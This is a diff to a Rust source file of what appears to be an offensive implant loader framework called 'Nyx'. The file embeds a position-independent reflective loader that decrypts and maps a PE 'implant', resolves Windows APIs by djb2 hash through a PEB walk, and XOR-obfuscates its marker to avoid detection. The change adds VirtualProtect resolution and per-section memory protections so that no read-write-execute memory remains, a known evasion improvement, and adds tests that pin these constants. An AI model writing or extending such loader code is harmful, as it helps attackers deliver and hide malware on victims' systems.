@@ -25,7 +25,8 @@
 //!     NYX2 header stays within the 256-byte scan bound.
 //!   * **The Layer-2 contract constants** — the djb2 hashes and Win32
 //!     constants below (`HASH_*`, `MEM_COMMIT_RESERVE`,
-//!     `PAGE_EXECUTE_READWRITE`, `DLL_PROCESS_ATTACH`, `KEY_LEN`,
+//!     `PAGE_READWRITE` / `PAGE_EXECUTE_READ` / `PAGE_READONLY`,
+//!     `DLL_PROCESS_ATTACH`, `KEY_LEN`,
 //!     `KEY_PATCH_OFFSET`) document the register/key layout the pic-loader
 //!     honours, and are pinned by host-side tests so the contract cannot
 //!     silently drift.
@@ -84,17 +85,50 @@ pub const HASH_LOAD_LIBRARY_A: u32 = 0x0666395B;
 /// djb2 hash of `"GetProcAddress"` → `0x82172F7F`.
 pub const HASH_GET_PROC_ADDRESS: u32 = 0x82172F7F;
 
+/// djb2 hash of `"VirtualProtect"` → `0x8B9EBDCD`.
+pub const HASH_VIRTUAL_PROTECT: u32 = 0x8B9EBDCD;
+
 /// `MEM_COMMIT | MEM_RESERVE` — the allocation type the stub passes to
 /// `VirtualAlloc`. Matches `winnt.h` (`MEM_COMMIT = 0x1000`,
 /// `MEM_RESERVE = 0x2000`).
 pub const MEM_COMMIT_RESERVE: u32 = 0x3000;
 
-/// `PAGE_EXECUTE_READWRITE` — the protection the decrypted PE image is mapped
-/// with. After sections + relocs + IAT are fixed up a real loader would
-/// `VirtualProtect` each section to its intended permission; the reflective
-/// loader keeps RWX for simplicity (the implant applies its own per-section
-/// protections later if it needs to).
+/// `PAGE_READONLY` (`winnt.h` 0x02) — headers after wipe, and R-only sections.
+pub const PAGE_READONLY: u32 = 0x02;
+
+/// `PAGE_READWRITE` (`winnt.h` 0x04) — decrypt buffer + mapped-image alloc,
+/// and WRITE (non-EXECUTE) sections after the write phase.
+pub const PAGE_READWRITE: u32 = 0x04;
+
+/// `PAGE_EXECUTE_READ` (`winnt.h` 0x20) — EXECUTE sections after the write
+/// phase. W+X Characteristics also land here (no RWX steady state).
+pub const PAGE_EXECUTE_READ: u32 = 0x20;
+
+/// `PAGE_EXECUTE_READWRITE` (`winnt.h` 0x40). Layer-2 does **not** map the
+/// image RWX: decrypt buffer and mapped image are `PAGE_READWRITE`, then each
+/// section is `VirtualProtect`'d. Kept so host tests can assert the helper
+/// never returns this as a steady-state protect.
 pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+
+/// `IMAGE_SCN_MEM_EXECUTE` (`winnt.h`).
+pub const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
+
+/// `IMAGE_SCN_MEM_WRITE` (`winnt.h`).
+pub const IMAGE_SCN_MEM_WRITE: u32 = 0x8000_0000;
+
+/// Map PE section `Characteristics` to the final `VirtualProtect` value.
+///
+/// Nyx policy is no RWX steady state: EXECUTE (with or without WRITE) → RX;
+/// WRITE → RW; else → R. Must stay in lockstep with the pic-loader copy.
+pub fn section_protect_from_characteristics(characteristics: u32) -> u32 {
+    if characteristics & IMAGE_SCN_MEM_EXECUTE != 0 {
+        PAGE_EXECUTE_READ
+    } else if characteristics & IMAGE_SCN_MEM_WRITE != 0 {
+        PAGE_READWRITE
+    } else {
+        PAGE_READONLY
+    }
+}
 
 /// `DLL_PROCESS_ATTACH` — the `reason` argument the stub passes to `DllMain`.
 pub const DLL_PROCESS_ATTACH: u32 = 1;
@@ -258,7 +292,8 @@ pub const LAYER2_ENTRY_OFFSET: usize = 0;
 /// (`extern "C" fn(key: *const u8, nonce: *const u8, ct: *const u8,
 /// ct_len: usize) -> usize`): `rcx=&key, rdx=&nonce, r8=&ct, r9=ct_len` — the
 /// exact ABI the Layer-1 bridge sets up. Returns `0` on success, `usize::MAX`
-/// on tag mismatch, small integers on PEB/alloc/PE-parse failures.
+/// on tag mismatch, `1`/`2`/`3` on PEB/alloc/VirtualProtect-resolve failures,
+/// `4..=15` on reflective-load stages (15 = section protect failed).
 pub const LAYER2_CODE: &[u8] = include_bytes!("../pic-loader/pic-loader.bin");
 
 /// The XOR key used to obfuscate the NYX2 magic in the Layer-1 scanner so no
@@ -328,17 +363,23 @@ mod tests {
             HASH_GET_PROC_ADDRESS,
             "GetProcAddress hash"
         );
-        // The four values must be distinct (a collision would mean the PEB walk
+        assert_eq!(
+            djb2(b"VirtualProtect"),
+            HASH_VIRTUAL_PROTECT,
+            "VirtualProtect hash"
+        );
+        // The values must be distinct (a collision would mean the PEB walk
         // could mis-resolve one API for another).
         let mut seen = vec![
             HASH_KERNEL32_DLL,
             HASH_VIRTUAL_ALLOC,
             HASH_LOAD_LIBRARY_A,
             HASH_GET_PROC_ADDRESS,
+            HASH_VIRTUAL_PROTECT,
         ];
         seen.sort_unstable();
         seen.dedup();
-        assert_eq!(seen.len(), 4, "bootstrap API hashes must not collide");
+        assert_eq!(seen.len(), 5, "bootstrap API hashes must not collide");
     }
 
     /// Verify the documented decimal values (the comments above each constant
@@ -350,6 +391,38 @@ mod tests {
         assert_eq!(HASH_VIRTUAL_ALLOC, 0x58DACBD7);
         assert_eq!(HASH_LOAD_LIBRARY_A, 0x0666395B);
         assert_eq!(HASH_GET_PROC_ADDRESS, 0x82172F7F);
+        assert_eq!(HASH_VIRTUAL_PROTECT, 0x8B9EBDCD);
+    }
+
+    /// Pin the section-protect mapping the pic-loader bakes in. W+X must
+    /// collapse to RX (never RWX); EXECUTE → RX; WRITE → RW; else → R.
+    #[test]
+    fn section_protect_from_characteristics_matches_udrl_policy() {
+        const IMAGE_SCN_MEM_READ: u32 = 0x4000_0000;
+        assert_eq!(
+            section_protect_from_characteristics(IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ),
+            PAGE_EXECUTE_READ
+        );
+        assert_eq!(
+            section_protect_from_characteristics(
+                IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE
+            ),
+            PAGE_EXECUTE_READ,
+            "W+X Characteristics must not stay RWX"
+        );
+        assert_eq!(
+            section_protect_from_characteristics(IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE),
+            PAGE_READWRITE
+        );
+        assert_eq!(
+            section_protect_from_characteristics(IMAGE_SCN_MEM_READ),
+            PAGE_READONLY
+        );
+        assert_eq!(section_protect_from_characteristics(0), PAGE_READONLY);
+        assert_ne!(
+            section_protect_from_characteristics(IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE),
+            PAGE_EXECUTE_READWRITE
+        );
     }
 
     /// `find_magic_offset` mirrors the on-target scan loop exactly. Put the
